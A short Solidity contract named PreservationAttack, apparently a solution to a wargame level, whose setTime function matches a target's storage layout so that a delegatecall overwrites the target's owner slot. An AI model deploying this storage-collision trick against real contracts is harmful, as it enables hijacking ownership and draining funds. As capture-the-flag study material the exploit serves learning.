// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract PreservationAttack {

  address slot0;
  address slot1; 
  address ownerSlot;

  function setTime(uint256 addressAsUint) public {
    // Sets the owner
    ownerSlot = address(uint160(addressAsUint));
  }
}
